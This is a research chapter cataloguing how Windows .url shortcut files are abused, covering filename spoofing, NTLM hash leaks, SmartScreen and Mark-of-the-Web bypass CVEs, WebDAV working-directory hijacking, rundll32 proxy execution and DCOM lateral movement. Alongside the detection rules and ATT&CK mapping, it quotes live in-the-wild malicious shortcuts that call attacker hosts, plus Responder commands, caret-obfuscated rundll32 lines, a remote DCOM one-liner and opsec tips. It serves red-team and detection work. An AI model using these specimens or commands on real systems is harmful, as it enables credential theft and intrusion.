# Abuse Cases: Offensive Security Playbook for .url Files

> Part of the [catalog](../README.md). [Chapters](README.md) · [Bibliography](../references.md) · [Specimens](../specimens/README.md)
>
> ← [5. Security behaviors](05-security-behaviors.md) · **Abuse cases** · [6. Rumors, versions, and gaps →](07-rumors-versions-gaps.md)
>
> Footnote numbers in this chapter restart at 1 and apply only inside this file. Every other chapter uses the global numbers in the [bibliography](../references.md).

> **Responsible-use notice.** Every technique in this chapter is documented from public research: vendor incident reports (Check Point, Trend Micro, Rapid7, Kaspersky), reverse-engineering write-ups (Quarkslab, M01N Team, 0patch), community tradecraft references (LOLBAS, hexacorn, bohops, pentestlab), and captured in-the-wild specimens. The material is intended for authorized red-team engagements, penetration tests under rules of engagement, and detection engineering. Using these techniques against systems you do not own or lack written authorization to test is illegal in most jurisdictions. Detection content is provided alongside every attack class so that defenders benefit at least as much as operators.

Terminology: **MotW** (Mark-of-the-Web) = the `Zone.Identifier` NTFS alternate data stream (ADS) on downloaded files; **SmartScreen** = the reputation check run on MotW-tagged content; **WebDAV** = the HTTP-based file protocol the WebClient service uses to carry UNC paths when SMB egress is blocked; **NTLMv2** = the challenge-response credential material leaked on authentication to an attacker server; **AQS** = Advanced Query Syntax, the query language of the `search-ms:` protocol.

## Contents

- [1. Abuse surface overview](#1-abuse-surface-overview)
- [2. Initial access & delivery](#2-initial-access-delivery)
- [3. Credential theft & coercion (NTLM)](#3-credential-theft-coercion-ntlm)
- [4. Command execution](#4-command-execution)
- [5. Defense evasion](#5-defense-evasion)
- [6. Execution proxying & lateral movement](#6-execution-proxying-lateral-movement)
- [7. Anti-forensics & detection engineering](#7-anti-forensics-detection-engineering)
- [8. MITRE ATT&CK mapping](#8-mitre-attck-mapping)
- [9. Per-field quick-reference abuse matrix](#9-per-field-quick-reference-abuse-matrix)

## 1. Abuse surface overview

The .url format's fields split into two trigger classes — **render-time** (parsed when Explorer merely displays the file) and **open-time** (honored when the shortcut is launched) — and every modern abuse chain is a composition of one delivery trick, one field that reaches the network, and one field that influences execution.[^1][^2]

| Field / feature | Abuse category | Kill-chain stage | Still works on patched Win11? | Precedent (CVE / campaign) | Confidence |
|---|---|---|---|---|---|
| `NeverShowExt` + double extension (`report.pdf.url`) | Filename spoofing | Initial access | Yes — extension hidden even with "show extensions" on[^3] | Water Hydra `photo_2023-12-29.jpg.url`[^4] | [Observed] |
| `URL=file://host` / `URL=\\host` | NTLM hash leak | Credential access | Gated by CVE-2024-43451 patch (Nov 2024)[^5] | osandamalith 2017; `xd.url` 2025[^6][^5] | [Observed] |
| `IconFile=\\host\share\x.ico` | NTLM hash leak at render | Credential access | Gated by CVE-2024-43451 patch[^5] | pentestlab recipe; `xd.url`[^7][^5] | [Observed] |
| `URL=` → local/remote executable | Direct execution | Execution | MotW-gated since MS16-104 (2016)[^2] | CVE-2016-3353 (ZDI-16-506)[^8] | [RE'd] |
| `URL=` zip-in-path (`…zip\payload`) | Execution + MotW evasion | Execution | Parameterized-branch gap patched (CVE-2023-36025); re-bypassed then re-patched (CVE-2024-21412, CVE-2024-29988)[^9][^10] | Phemedrone, DarkGate, Remcos, Mispadu[^11] | [RE'd] |
| `URL=` → second `.url` (chaining) | SmartScreen bypass | Defense evasion | Patched Feb 2024 (CVE-2024-21412)[^12] | Water Hydra, DarkGate[^4][^13] | [Observed] |
| `URL=search-ms:…` (AQS) | Remote folder lure | Initial access | Yes — `search-ms:` handler unpatched; heavily used 2022–2024[^14][^15] | AsyncRAT / trycloudflare campaigns[^16] | [Observed] |
| `WorkingDirectory=` → WebDAV UNC | CWD search-order hijack → RCE | Execution | Patched Jun 2025 — value ignored when launching executables (CVE-2025-33053)[^17] | Stealth Falcon / Horus[^18] | [RE'd] |
| `ShowCommand=7` | Window hiding | Defense evasion | Yes — cosmetic field, never patched[^19] | DarkGate, Stealth Falcon specimens[^13][^18] | [Observed] |
| `IconFile=` local DLL/EXE + `IconIndex=` | Icon disguise | Defense evasion | Yes[^19] | `DocuSign3.url` (msedge.exe icon)[^11] | [Observed] |
| `[InternetShortcut.W]` UTF-7 `URL=` | Parser smuggling | Defense evasion | Yes — almost no security tooling decodes UTF-7[^20] | Blind Eagle (CERT-UA campaign)[^20] | [Observed] |
| `Prop3=19,9` (undocumented PROPID) | Unknown; detection marker | — | n/a — semantics undocumented[^21] | Recurs in MS16-104/36025/21412 specimens[^2][^11][^4] | [Observed] |
| `rundll32 ieframe/url.dll/shdocvw.dll,OpenURL` | Signed-binary proxy execution | Execution / defense evasion | Yes — LOLBAS-listed for Win10/11[^22][^23][^24] | hexacorn 2017/2018; bohops 2018[^25][^26][^27] | [Documented] |
| DCOM `ShellBrowserWindow.Navigate` + UNC `.url` | Remote execution | Lateral movement | Yes where DCOM is permitted[^27] | bohops 2018[^27] | [Documented] |
| `.url` content in NTFS ADS | Payload concealment | Defense evasion | Yes via OpenURL exports[^28] | sailay1996 notes[^28] | [Observed] |
| `Modified=` forged FILETIME | Anti-forensics | — | Yes — no validation of the value[^19] | Stealth Falcon reused canned value[^18] | [Observed] |
| `[Bookmarklet] ExtendedURL=` (≤5119 bytes) | Script smuggling (IE legacy) | Execution | IE-dependent; IE app disabled on 24H2[^29] | Bookmarklet specimens[^30] | [Observed] |
| `.website` extension | Alternative carrier | Initial access | Yes — same parser, extra property sections[^5] | `xd.website` (NTLM campaign)[^5] | [Observed] |

Two rows deserve emphasis because they define the modern meta. First, the **render-time credential rows** (`URL=file://`, `IconFile=\\`) are the only fields that weaponize *without* the victim opening anything: Explorer resolves them to draw icons and folder views, so selection, right-click, delete, or drag suffices.[^5] Second, the **open-time execution rows** show a decade-long pattern: Microsoft patches one branch (MotW dialog in 2016, SmartScreen branch in 2023, chaining in 2024, WorkingDirectory in 2025) while the scheme-agnostic `URL=` plus transparent WebDAV mounting stays open as the carrier — so "still works?" answers are per-field and per-patch-level, never global.[^2][^17]

## 2. Initial access & delivery

### 2.1 Extension and filename spoofing

| Technique | Mechanism | Evidence | Confidence |
|---|---|---|---|
| Double extension (`X.pdf.url`) | `HKCR\InternetShortcut\NeverShowExt` hides `.url` even when Explorer is set to show extensions; the file presents as a PDF | NCC Group hidden-extension enumeration lists `.URL` and `.website`[^3]; Water Hydra's `photo_2023-12-29.jpg.url` posed as a JPEG[^4] | [Observed] |
| Renamed-extension tolerance | The OpenURL exports parse content, not extension: "the .url file extension can be renamed" | LOLBAS Ieframe/Shdocvw entries[^22][^24] | [Documented] |
| `.website` as alternative extension | Same INI grammar plus pinned-site property sections; also covered by `NeverShowExt`; opens via `iexplore.exe -w` rather than the default browser | `xd.website` specimen[^5]; ZDNet pinned-site documentation[^31] | [Observed] |
| `.url` inside ZIP container | Archive delivery carries the file past mail gateways; sibling files in the archive (`.library-ms`, `.lnk`) trigger on extraction or click | `xd.zip` contained `.library-ms` + `.url` + `.website` + `.lnk`, all pointing at one SMB server[^5] | [Observed] |
| `.url` content in an ADS | `[InternetShortcut]` lines appended to `file.txt:stream` execute via `rundll32 ieframe.dll,OpenURL file.txt:stream` | sailay1996 ADS notes[^28] | [Observed] |
| Bidi Unicode | In-the-wild PoC specimens carry bidirectional control characters inside the file (GitHub renders a bidi warning); filename-level RTLO spoofing is a general delivery trick applied to `.url` names | milo2012 CVE-2024-43451 PoC gist[^32]; filename RTLO: [Hypothesis] — no .url-specific specimen in the research set | [Observed] / [Hypothesis] |

MotW propagation through containers is the remaining gap class: each SmartScreen CVE (§5) exists because a container or indirection — zip-in-path, a second .url hop, an archive member — kept the outer file's MotW from reaching the executed inner payload.[^9][^4] ZIP-borne .url files *do* carry MotW after extraction (the MS16-104 patch keys on exactly that condition), so post-2016 chains all add a second evasion layer rather than relying on container delivery alone.[^2] ISO/VHD container variants (e.g. TA544's `file://….zip/*.vhd` mounting trick) are documented at campaign level only.[^9]

### 2.2 The `search-ms:` lure layer

A .url whose `URL=` is a `search-ms:` or `search:` AQS query opens Explorer "search results" rendering a *remote* WebDAV share under an attacker-chosen window title, mixing remote content with local-folder appearances:[^33]

```
[InternetShortcut]
URL=search-ms:crumb=location:C%3a%5cUsers%5cUser%5cDownloads%5c&crumb=location:%5C%5Cexample.com%5cDavWWWRoot%5c&displayname=Downloads
```

Water Hydra industrialized this as an HTML anchor (`search:query=photo_2023-12-29.jpg&crumb=location:\\84.32.189.74@80\fxbulls\pictures&displayname=Downloads`) constraining the search to the malicious share while `displayname` masquerades as the local Downloads folder; Trellix documents the same anatomy with `@SSL\DavWWWRoot` crumbs, and Forcepoint/pentestlab document in-the-wild HTML-attachment delivery filtering to a single payload file type.[^4][^14][^16][^15] The Explorer interstitial for `search:` links is explicitly "not a security prompt."[^4]

## 3. Credential theft & coercion (NTLM)

### 3.1 The primitive

Two fields force NTLM authentication to an attacker host when the shell *renders* the file — no double-click required:[^1][^5]

```
[InternetShortcut]
URL=file://159.196.128[.]120/
IconIndex=4
HotKey=0
IDList=
IconFile=\\159.196.128[.]120\share\pentestlab.ico
```

This is the verbatim in-the-wild `xd.url` (SHA1 `76e93c97ffdb5adb509c966bca22e12c4508dcaa`) from the March 2025 "NTLM Exploits Bomb" campaign against Polish and Romanian institutions; the `pentestlab.ico` filename is copied straight from the 2017 pentestlab SCF recipe.[^5][^7] A minimal operator-authored variant needs only two lines (`[InternetShortcut]` / `URL=file://<host>/x`), per the original 2017 osandamalith write-up.[^6]

### 3.2 Trigger surface, transport, and workflow

| Aspect | Detail | Confidence |
|---|---|---|
| Trigger interactions | Folder view / icon resolution (classic); per CVE-2024-43451: right-click, delete, drag-and-drop; per Microsoft on the sibling CVE-2025-24054: "selecting (single-clicking), inspecting (right-clicking), or performing any action other than opening or executing" | [Observed][^5] |
| Leak fields | `.url` via `URL=` field; `.url` via `ICONFILE` field — both fire on browsing the containing folder (ntlm_theft catalog) | [Documented][^1] |
| Username exfil channel | `IconFile=\\192.168.49.102\%USERNAME%.ico` — environment variables are expanded, so the username arrives inside the SMB request (2018 field recipe, widely reproduced) | [Observed][^1] |
| WebDAV fallback | Where SMB/445 egress is blocked, WebClient carries the UNC over HTTP: Blind Eagle "specified port 80 in the UNC path … the connection [is] made directly using the WebDAV protocol over HTTP … also leaks NTLM hashes" | [Observed][^34] |
| Tooling | Responder (`responder -wrf --lm -v -I eth0`) or Metasploit `auxiliary/server/capture/smb` server-side; Greenwolf `ntlm_theft` generates the .url (and 15+ sibling filetype) payloads | [Documented][^7][^1] |
| Monetization | Captured NTLMv2-SSP responses are cracked offline or relayed (SMB signing absent) → privilege escalation, lateral movement, possible domain compromise | [Observed][^7] |
| Patch status | CVE-2024-43451 patched 2024-11-12 after zero-day use against Ukraine (CERT-UA: UAC-0194); the `.library-ms` sibling CVE-2025-24054 patched 2025-03-11 and was weaponized within 8 days | [Observed][^5] |

The genealogy matters for planning: Microsoft treated the 2017 SCF variant as by-design (advisory ADV170014 only), so the primitive survived seven years before the .url form was patched as CVE-2024-43451 — and the same "Explorer auto-authenticates to render" root cause immediately re-emerged in `.library-ms`.[^35][^5] Opsec: the attack is server-side (the file is a lure; Responder does the work), so the payload is a ~100-byte text file with nothing for gateways to detonate; the trade-off is a cleartext attacker IP. Combo play: `xd.zip` shipped four coercion filetypes at once (`.library-ms` = zero-click on extraction, `.url`/`.website` = minimal interaction, `.lnk` = manual click), maximizing the chance one trigger condition is met.[^5]

## 4. Command execution

### 4.1 `URL=` direct execution and its hard constraint

Quarkslab's patch-diff localizes the open path: `rundll32.exe ieframe.dll,OpenURL %l` → `CInternetShortcut::LoadFromFileW` parses the file → `CExecHelper` builds a `SHELLEXECUTEINFO`, verifies the scheme is registered (`ResolveProtocol`), tries IE (`IEDirectExec`), and falls back to `ShellExecuteEx`.[^2] The critical constraint: **`lpParameters` is NULL** — no command-line arguments, so "we aren't able to abuse local interpreters like cscript, wscript or powershell, and we need to provide the file to be executed instead."[^2] `URL=` may be a `file://` URL, a UNC, or a bare local path (`URL=C:\x` occurs in real files).[^36]

### 4.2 Zip-in-path execution

Explorer treats ZIP archives as folders, so `ShellExecute` on a path *inside* a zip runs the inner file — and since the payload never lands on an ADS-marked NTFS path, MotW warnings are evaded. The trick originates with Tavis Ormandy's Project Zero #693; Quarkslab verified it over remote SMB (`file:///\\host\share\test.zip\ms16-104.hta`), and the 2023–2024 campaigns moved it to WebDAV with `.cpl`/`.cmd`/`.msi`/`.vbs` payloads.[^37][^2][^11] In-the-wild `DocuSign3.url` (Phemedrone Stealer, CVE-2023-36025):[^11]

```
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,9
[InternetShortcut]
IDList=
URL=file://51.79.185.145/pdf/data3.zip/pdf3.cpl
IconIndex=12
HotKey=0
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

### 4.3 `WorkingDirectory=` WebDAV CWD hijack (CVE-2025-33053) — the full chain

The Stealth Falcon specimen `TLM.005_TELESKOPIK_MAST_HASAR_BILDIRIM_RAPORU.pdf.url`, verbatim:[^18]

```
[InternetShortcut]
URL=C:\Program Files\Internet Explorer\iediagcmd.exe
WorkingDirectory=\\summerartcamp[.]net@ssl@443/DavWWWRoot\OSYxaOjr
ShowCommand=7
IconIndex=13
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Modified=20F06BA06D07BD014D
```

Per-field composition: `URL=` names a *local, signed* binary (nothing remote is dropped); `WorkingDirectory=` sets the CWD to an attacker WebDAV share (`@ssl@443/DavWWWRoot` = WebDAV over HTTPS); `iediagcmd.exe` internally calls .NET `Process.Start()` with **bare filenames** (`route`, `ipconfig`, `netsh`, `ping`), and the search order checks the CWD first, so the attacker's `route.exe` (the "Horus Loader") runs instead of `system32\route.exe`; `ShowCommand=7` minimizes the window; `IconFile`/`IconIndex=13` borrow the Edge icon.[^18] Artifacts also show `CustomShellHost.exe` abused the same way to spawn `explorer.exe` from its working folder.[^18]

| Aspect | Detail | Confidence |
|---|---|---|
| LOLBin candidate class | [Hypothesis] Any signed binary that launches **bare-name child processes** (no full path) via `Process.Start`/`CreateProcess` is a candidate CWD-hijack target. Observed members: `iediagcmd.exe` (route/ipconfig/netsh/ping), `CustomShellHost.exe` (explorer.exe)[^18] | [Hypothesis] / [Observed] |
| Attacker-variant catalog | Rapid7 recovered **59 alternative .url LOLBin variants** from an exposed attacker test server: CustomShellHost, InstallUtil, RegAsm, RegSvcs, CasPol, ngentask, AddInUtil, dfsvc, csc, vbc, LbfoAdmin, UevAgentPolicyGenerator, UevAppMonitor, AppVStreamingUX, Pcwrun, WorkFolders, stordiag, Provlaunch, fodhelper, computerdefaults, wsreset, etc. | [Observed][^38] |
| Win11 24H2 caveat | Technique needs `iediagcmd.exe`; 24H2 removes IE → original variant fails ("this is why your F-series failed!" — attacker test notes); the 59 variants are the workaround | [Observed][^38] |
| Patched behavior | June 10, 2025: "Microsoft patched this issue by changing the behavior of URL files such as to ignore the WorkingDirectory value when launching executables" (0patch analysis); attacker notes: "Microsoft patch from June 2025 MUST NOT be installed" | [RE'd][^17][^38] |

### 4.4 Custom protocol handlers and chaining

`ResolveProtocol` only checks that the scheme is *registered*, so any protocol with a local handler binary is reachable from `URL=`.[^2] Observed benign-but-demonstrative specimens: `URL=steam://rungameid/730` (Steam) and `URL=com.epicgames.launcher://apps/Fortnite?action=launch&silent=true` (Epic, with `WorkingDirectory=` and exe-as-IconFile).[^39][^40] [Hypothesis] `ms-*` schemes and third-party handlers with argument-injection flaws are equally reachable; no malicious .url specimen using them appears in the research set. Two further open-time tricks: **.url→.url chaining** (§5, the CVE-2024-21412 bypass, where the first shortcut's `URL=` points at a second shortcut on WebDAV)[^4] and **direct DavWWWRoot script execution** (`URL=file://….trycloudflare.com@SSL/DavWWWRoot/tgpzdcv.wsh`), which "forced the victim's Windows OS to use native, trusted components to reach out to the remote file as if it were on a local network share."[^41]

## 5. Defense evasion

### 5.1 MotW / SmartScreen bypass lineage

| CVE (patched) | What the patch closed | What survived | Confidence |
|---|---|---|---|
| CVE-2016-3353 (Sep 2016, MS16-104) | ieframe never checked MotW on .url open; patch gates `_InvokeCommand` behind `CDownloadUtilities::OpenSafeOpenDialog` when extension = .URL **and** MotW ADS present[^2][^42] | Zip-in-path and WebDAV carriers; technique migrated to Windows core components[^43] | [RE'd] |
| CVE-2023-36025 (Nov 2023) | `windows.storage.dll!CInvokeCreateProcessVerb::ProcessCommandTemplate`: the *parameterized* launch branch (payload run via wscript/control.exe) skipped `CheckSmartScreenWithAltFile`; patch adds the check to that branch (M01N Team RE)[^9] | .url→.url chaining (21412)[^4] | [RE'd] |
| CVE-2024-21412 (Feb 2024) | Chained shortcut resolution "failed to properly apply Mark-of-the-Web"; patch applies MotW/SmartScreen to the final target (exact mechanics unpublished by Microsoft)[^12][^4] | Re-bypassed two months later by CVE-2024-29988 (Apr 2024); CVE-2024-38213 "copy2pwn" followed in June[^10] | [Observed] |
| CVE-2024-43451 (Nov 2024) | NTLM disclosure on render-time interactions with .url | `.library-ms` sibling (CVE-2025-24054, Mar 2025)[^5] | [Observed] |
| CVE-2025-33053 (Jun 2025) | `WorkingDirectory` ignored when launching executables[^17] | 59 attacker-generated LOLBin variants pre-staged against unpatched hosts[^38] | [RE'd] |

The archaeology shows format-level, not bug-level, fixes: Microsoft progressively *depowers individual fields* rather than documenting the format, so the red-team answer to "does it work?" is always per-field, per-build.[^43]

### 5.2 `Prop3=19,9` — the recurring marker

`Prop3=19,9` (PROPID 3, VT_UI4, value 9, in the `FMTID_Intshcut` property section) appears in the MS16-104 PoC, the CVE-2023-36025 `DocuSign3.url`, and the CVE-2024-21412 second-stage `2.url` — while benign IE-written files carry `Prop3=19,2` or `19,11` and Epic/Steam shortcuts carry `19,0`.[^2][^11][^4][^40] Quarkslab's binary analysis assigns it **no exploit role**, and Microsoft documents FMTID_Intshcut PIDs 2, 4–14 but not PID 3; semantics are unknown.[^2][^21] Treat it as a **detection-signature opportunity** (recurrence across three exploit generations) and an **open research question** — not a vulnerability trigger. [Hypothesis] Value 9 coinciding with SW_RESTORE is community speculation without authoritative confirmation.

### 5.3 Parser differentials and smuggling

| Technique | Mechanism | Evidence | Confidence |
|---|---|---|---|
| UTF-7 `[InternetShortcut.W]` smuggling | `.W` sections store UTF-7 (`+AF8-` = `_`); the operative `URL=` is placed *after* empty `.A`/`.W` sections; almost no security tooling decodes UTF-7 | Blind Eagle specimen: `Certificate+AF8hFgBf-45052389+AF8-005553.exe`[^20]; benign proof: `Procédure`/`Proc+AOk-dure` pair[^44] | [Observed] |
| `.A`/`.W` section splitting | Empty `[InternetShortcut.A]`/`[InternetShortcut.W]` sections with the real URL only in the last section defeats naive single-section parsers | milo2012 CVE-2024-43451 PoC gist[^32] | [Observed] |
| Malformed GUID sections | `[{009862A0-0000-0000-C0000-000000005986}]` (extra `0` in 4th group) breaks strict-GUID parsers while the shell tolerates it | Same PoC gist[^32] | [Observed] |
| Quote/case/duplicate laxity | `GetPrivateProfileString` semantics: ASCII-case-insensitive names, whitespace trim, matched-double-quote stripping, **first duplicate wins**, `;`-only comments | rclip-url-file parser documentation[^36] | [RE'd] |
| Whitespace / wide-encoding tolerance | Real parsers accept `[ InternetShortcut ]` with inner whitespace and UTF-16LE files | Will Dormann YARA rule patterns (`$a_w = "[InternetShortcut]" wide nocase`)[^45] | [Observed] |
| `javascript:` bookmarklets | `[Bookmarklet] ExtendedURL=` carries up to **5119 bytes** of script (URL= holds a 2083-byte truncated copy; the two must be kept in sync); files may be UTF-16LE when script contains CJK | Bookmarklet gist + generator specimens[^30][^46] | [Observed] |

The defensive implication: a scanner that decodes only the plain `[InternetShortcut]` section, honors last-duplicate-wins, or rejects UTF-16/UTF-7 encodings sees a different file than ieframe does.[^36][^46]

## 6. Execution proxying & lateral movement

### 6.1 The OpenURL exports (T1218.011)

Three System32 DLLs export `OpenURL`, giving signed-binary proxy execution of any payload a .url can express:[^27]

| Command | Notes | Confidence |
|---|---|---|
| `rundll32.exe ieframe.dll,OpenURL <path>.url` | The live shell open command since Vista; renamed extension tolerated | [Documented][^22] |
| `rundll32.exe url.dll,OpenURL <path>.url` | Also `OpenURLA`; runs `.hta` directly too | [Documented][^23] |
| `rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e` | Caret obfuscation defeats naive command-line matching; also `FileProtocolHandler calc.exe` bare | [Documented][^23] |
| `rundll32.exe shdocvw.dll,OpenURL <path>.url` | XP-era association; variant contributed by bohops | [Documented][^24] |
| `rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt` | .url content hidden in an NTFS ADS | [Observed][^28] |

All exports call `ShellExecute` with a NULL verb, resolving the registry default handler.[^27] **Parent-spoofing angle** (hexacorn): copy `rundll32.exe` to `%appdata%\Adobe\adobe.exe` and the payload's parent appears as `adobe.exe` — the same proxy primitive with a forged lineage.[^25] Sigma's "Potentially Suspicious Rundll32 Activity" rule flags all five DLL+export pairs.[^47]

### 6.2 DCOM lateral movement

The `ShellBrowserWindow` DCOM object (CLSID `C08AFD90-F2A1-11D1-8455-00A0C91F3880`; `ShellWindows` = `9BA05972-F6A8-11CF-A442-00A0C90A8F39`) exposes `IWebBrowser2.Navigate`/`Navigate2`, which accept UNC paths and run "without the Internet Explorer security constraints":[^27]

```powershell
$([activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","acmedc.acme.int"))).Navigate("\\acme01.acme.int\c$\calc.url")
```

This executes a .url hosted on the target's `C$` share in the remote host's context — pass-thru execution where the .url is both transport and payload.[^27]

## 7. Anti-forensics & detection engineering

### 7.1 Anti-forensic properties of the format

| Property | Detail | Confidence |
|---|---|---|
| `Modified=` timestamp forgery | The value is a byte-reversed (little-endian-read) FILETIME plus one trailing checksum byte; nothing validates it, so an operator can encode any timestamp. Notably, the Stealth Falcon specimen's `Modified=20F06BA06D07BD014D` is byte-identical to the canonical Wikipedia-format example — a copied, not genuine, timestamp | [Observed][^19][^18] |
| Benign-noise keys | `HotKey=0`, `IDList=`, `IconIndex=` mimic machine-written IE favorites and pad the file past naive "too small to be real" heuristics; every in-the-wild specimen carries some subset | [Observed][^48][^11] |
| Minimal-file opsec | "Only the URL value in the InternetShortcut section is required, everything else is optional" — a two-line file is fully functional, minimizing signature surface | [Documented][^48] |
| No executable content | The lure is pure text; all logic lives server-side (Responder) or in the OS parser, so sandbox detonation of the file itself yields little | [Inference] from §3–§4 mechanics |
| Encoding variance | ANSI/CP1252, UTF-16LE with BOM, UTF-8 (Wine), and UTF-7 `.W` sections all parse; choose per target EDR's weakest decoder | [Observed][^36][^46] |

### 7.2 Detection opportunities per field

| Field / artifact | What defenders can log | Detection idea | Source | Confidence |
|---|---|---|---|---|
| `WorkingDirectory=` | Process creation with `CurrentDirectory` starting `\\` or containing `\DavWWWRoot\` | Sigma CVE-2025-33053 rule: children (route.exe, netsh.exe, makecab.exe, dxdiag.exe, ipconfig.exe, explorer.exe) of iediagcmd.exe / CustomShellHost.exe with UNC CWD | [^49] | [Documented] |
| `WorkingDirectory=` (file content) | Gateway/YARA content scan | `.url` files containing `@80`, `@ssl@443`, or `DavWWWRoot` | [^50] | [Documented] |
| `IconFile=` UNC | File content + outbound SMB/WebClient connections from explorer.exe | Hunt `IconFile=\\` and `IconFile=http` in .url content; alert explorer.exe → 445/80/443 to rare external IPs | [^50][^34] | [Observed] |
| OpenURL proxying | Process command lines | Sigma "Potentially Suspicious Rundll32 Activity": url.dll+OpenURL/OpenURLA/FileProtocolHandler, ieframe.dll+OpenURL, shdocvw.dll+OpenURL | [^47] | [Documented] |
| Parser-laxity evasions | File content | Will Dormann's YARA: whitespace-tolerant `[InternetShortcut]` header, `wide` (UTF-16) variant, `URL=\\`, `URL=\/`, `file:\\/`, `file:////` obfuscations | [^45] | [Documented] |
| `Prop3=19,9` | File content | [Hypothesis] High-fidelity hunting value: recurs across MS16-104/36025/21412 specimens, rare in benign files (`19,2`/`19,11`/`19,0`); semantics unknown — hunt, don't block | [^2][^11][^4] | [Hypothesis] |
| `.url` in email/archives | Gateway rules | [Inference] Block or rewrite `.url`/`.website`/`.library-ms` attachments and zip members; Water Hydra, DarkGate, Phemedrone, and the NTLM campaigns all arrived by mail or archive | [^4][^13][^11] | [Inference] |
| `search-ms:` | Browser/Explorer telemetry | Explorer or browser activity immediately opening `search-ms:` / `.library-ms` references pointing to external shares | [^50] | [Documented] |
| `Modified=` | Forensic timeline | [Inference] A `Modified` value equal to the Wikipedia example (`20F06BA06D07BD014D`) or inconsistent with filesystem timestamps flags hand-crafted files | [^19][^18] | [Inference] |

The overarching detection gap is the render-time/open-time split: tooling that scans .url files only at open misses the entire NTLM-leak class, which fires at enumeration.[^1] Conversely, scanners implementing a stricter INI grammar than `GetPrivateProfileString` (case-sensitive keys, last-duplicate-wins, no quote stripping, no UTF-7/UTF-16 decoding) parse a different file than the shell — every laxity row in §5.3 is a scanner-evasion primitive.[^36]

## 8. MITRE ATT&CK mapping

| Technique | .url feature | Example procedure (from research) | Confidence |
|---|---|---|---|
| T1566.001 — Phishing: Spearphishing Attachment | Double-extension .url in email/zip | DarkGate PDF lures → `JANUARY-25-2024-FLD765.url`; "NTLM Exploits Bomb" malspam with `xd.zip`[^13][^5] | [Observed] |
| T1204.002 — User Execution: Malicious File | `URL=` open-time execution | Victim opens `DocuSign3.url` → zip-in-path `.cpl` executes[^11] | [Observed] |
| T1036.007 — Masquerading: Double File Extension | `NeverShowExt` hides `.url` | `photo_2023-12-29.jpg.url` rendered as JPEG[^3][^4] | [Observed] |
| T1036 — Masquerading (icon) | `IconFile=`/`IconIndex=` borrowing Edge/shell32/imageres icons | `DocuSign3.url` (msedge.exe icon, index 12); Water Hydra imageres.dll index 126[^11][^4] | [Observed] |
| T1187 — Forced Authentication | `IconFile=\\` / `URL=file://` | `xd.url` leaks NTLMv2-SSP on right-click/delete/drag[^5] | [Observed] |
| T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Captured NTLMv2 relayed where SMB signing absent | Responder capture workflow; relay → lateral movement[^7][^1] | [Documented] |
| T1218.011 — System Binary Proxy Execution: Rundll32 | `ieframe/url.dll/shdocvw.dll,OpenURL` | LOLBAS entries; hexacorn parent-spoofing variant[^22][^25] | [Documented] |
| T1218.002 — System Binary Proxy Execution: Control Panel | Zip-in-path `.cpl` payload | Phemedrone chain executes `pdf3.cpl` via control.exe[^11] | [Observed] |
| T1553.005 — Subvert Trust Controls: Mark-of-the-Web Bypass | Zip-in-path, .url chaining, WorkingDirectory carrier | CVE-2023-36025 / CVE-2024-21412 / CVE-2025-33053 lineages[^9][^12][^17] | [RE'd] |
| T1027 — Obfuscated Files or Information | UTF-7 `.W` sections, caret-obfuscated FileProtocolHandler, malformed GUID sections | Blind Eagle `+AF8-` URL; r0lan caret variant[^20][^23] | [Observed] |
| T1564.004 — Hide Artifacts: NTFS File Attributes | .url content in ADS | `rundll32 ieframe.dll,OpenURL fake.txt:test.txt`[^28] | [Observed] |
| T1070.006 — Indicator Removal: Timestomp | Forged `Modified=` FILETIME | Stealth Falcon's copied `Modified` value[^18][^19] | [Observed] |
| T1021.003 — Remote Services: Distributed Component Object Model | `ShellBrowserWindow.Navigate` with UNC .url | bohops lateral-movement PoC[^27] | [Documented] |
| T1059.003 — Command and Scripting Interpreter: Windows Command Shell | Zip-in-path `.cmd` stage | Water Hydra `a2.cmd` copies and rundll32's the DarkMe DLL[^4] | [Observed] |

## 9. Per-field quick-reference abuse matrix

| Key / section | Weaponizable? | How | Status on patched Win11 | Confidence |
|---|---|---|---|---|
| `[InternetShortcut] URL=` | **Yes — primary** | Execution target, NTLM coercion, search-ms lure, protocol-handler reach, .url chaining | MotW/SmartScreen-gated since 2016/2023/2024; field itself untouched | [RE'd][^2] |
| `IconFile=` | **Yes** | NTLM leak (UNC/HTTP), icon disguise (local DLL/EXE) | Leak gated by CVE-2024-43451; disguise unpatched | [Observed][^5] |
| `IconIndex=` | Assist | Selects disguise icon within IconFile | Unpatched (cosmetic) | [Documented][^19] |
| `WorkingDirectory=` | **Yes** | WebDAV CWD hijack of bare-name-child LOLBins | **Neutralized Jun 2025** — ignored when launching executables | [RE'd][^17] |
| `ShowCommand=` | Assist | `7` = SW_SHOWMINNOACTIVE window hiding | Unpatched (cosmetic) | [Observed][^19] |
| `HotKey=` | Noise only | `HotKey=0` benign mimicry; activation hotkey has no remote-abuse path | Unpatched | [Documented][^19] |
| `Modified=` | Anti-forensics | Forged byte-reversed FILETIME timestamp | Unpatched; unvalidated | [Observed][^19] |
| `IDList=` | Noise / minor | Empty in most specimens; Explorer prefers IDList to locate the resource (drag-generated local file:// shortcuts) | Unpatched | [Observed][^51] |
| `Roamed=`, `Author=`, `WhatsNew=`, `Comment=`, `Desc=` | No | Legacy IE-favorites metadata; no longer parsed on Win10/11 | Inert | [Observed][^51] |
| `[InternetShortcut.A]` | Assist | ANSI-codepage duplicate URL; parser-differential splitting | Live | [Observed][^44] |
| `[InternetShortcut.W]` | **Yes** | UTF-7 smuggling channel for the operative URL | Live — tooling gap | [Observed][^20] |
| `[{000214A0-…-0046}] Prop3=` | Marker / unknown | Undocumented PROPID 3 (VT_UI4); `19,9` recurs in exploit specimens | Live; semantics unknown — hunt it | [Observed][^2] |
| `Prop4=` | Assist | VT_LPWSTR title (`.website` display name) — social-engineering text | Live | [Observed][^5] |
| `[{A7AF692E-…}]` Prop2/5/6/9 | No (format ballast) | `.website` pinned-site property blob; Prop2 VT_BLOB semantics undocumented; copying real sections improves mimicry | Live | [Observed][^5] |
